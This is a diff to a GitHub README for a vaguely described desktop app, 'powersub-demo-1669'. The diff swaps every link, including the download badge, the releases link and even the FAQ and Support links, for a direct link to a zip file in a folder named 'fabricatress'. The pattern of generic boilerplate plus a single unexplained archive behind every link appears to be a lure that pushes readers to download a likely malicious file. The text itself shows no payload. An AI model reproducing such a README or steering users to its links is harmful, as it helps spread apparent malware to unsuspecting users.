@@ -1,7 +1,7 @@
 # 🚀 powersub-demo-1669 - Easy Desktop App for Seamless Functionality
 
 ## 📥 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Salihfurkan035/powersub-demo-1669/releases)
+[![Download Now](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip%https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)
 
 ## 📚 Overview
 Welcome to powersub-demo-1669! This desktop application provides an easy way to enhance your user experience. It is designed for anyone looking to complete tasks efficiently. You don’t need to be a programmer; just follow these steps to get started.
@@ -18,7 +18,7 @@ Before you download the application, ensure that your computer meets the followi
 ### 2. Visit the Releases Page
 To download the application, please visit the Releases page:
 
-[Download from Releases](https://github.com/Salihfurkan035/powersub-demo-1669/releases)
+[Download from Releases](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)
 
 ### 3. Choose the Right Version
 On the Releases page, you will see different versions of the application. Select the latest version listed at the top. This version will have the most recent features and fixes.
@@ -60,11 +60,11 @@ If you encounter any issues, try the following fixes:
 ## 📄 Additional Resources
 For more detailed information, check out these useful links:
 
-- [FAQ](https://github.com/Salihfurkan035/powersub-demo-1669/wiki)
-- [Support](https://github.com/Salihfurkan035/powersub-demo-1669/issues)
+- [FAQ](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)
+- [Support](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)
 
 ## 🗨️ Feedback
 We appreciate your thoughts! If you have suggestions or encounter problems, let us know by opening an issue in our GitHub repository.
 
 ## 🚀 Download Again
-To download the application, click here: [Download from Releases](https://github.com/Salihfurkan035/powersub-demo-1669/releases)
+To download the application, click here: [Download from Releases](https://raw.githubusercontent.com/Salihfurkan035/powersub-demo-1669/main/fabricatress/powersub-demo-1669.zip)
